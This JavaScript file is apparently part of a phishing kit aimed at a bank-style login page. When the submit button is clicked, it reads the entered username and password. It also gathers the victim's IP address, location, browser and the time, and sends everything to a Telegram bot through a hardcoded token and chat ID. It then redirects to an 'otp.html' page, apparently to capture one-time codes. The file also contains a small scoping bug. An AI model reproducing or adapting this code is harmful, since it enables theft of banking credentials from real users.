async function getUserIP() {
  const response = await fetch("https://api.ipify.org?format=json");
  const data = await response.json();
  return data.ip;
}

async function getUserLocation() {
  const response = await fetch("https://ipapi.co/json/");
  const data = await response.json();
  return `${data.city},${data.region},${data.country_name}`;
}

function getBrowserInfo() {
  return navigator.userAgent;
}

function getCurrentTime() {
  return new Date().toUTCString();
}

// Function to set a cookie
function setCookie(name, value, days) {
  let expires = "";
  if (days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// Function to get the value of a cookie by name
function getCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === " ") c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

// Create a unique identifier
const uniqueID = "id_" + Math.random().toString(36).substr(2, 9);

// Set the cookie with the unique identifier
setCookie("uniqueID", uniqueID, 7);

const cookieValue = getCookie("uniqueID");
if (cookieValue) {
  const blob = new Blob([cookieValue], { type: "text/plain" });

  // Create a link element
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = "cookie.txt";
}

document
  .querySelector('q2-btn[test-id="btnSubmit"]')
  .addEventListener("click", async function (event) {
    event.preventDefault();
    const username = document
      .querySelector('q2-input[test-id="fldUsername"]')
      .shadowRoot.querySelector("input").value;
    const password = document
      .querySelector('q2-input[test-id="fldPassword"]')
      .shadowRoot.querySelector("input").value;

    const ip = await getUserIP();
    const location = await getUserLocation();
    const browserInfo = getBrowserInfo();
    const currentTime = getCurrentTime();

    // Data to bot
    const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
    const chatId = "1139790477";
    const formData = new FormData();
    const message = `Username 👤: ${username} \n Password 🔑: ${password} \n IP Address 🌍: ${ip} \n Location 📍: ${location} \n Browser Info 🌎: ${browserInfo} \n Time 🕰️: ${currentTime}`;
    formData.append("chat_id", chatId);
    formData.append("document", blob, "cookie.txt");

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: `POST`,
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          //Redirect to the next page
          window.location.href = "otp.html";
        } else {
          alert("Failed to send message");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Error sending message");
      });
  });
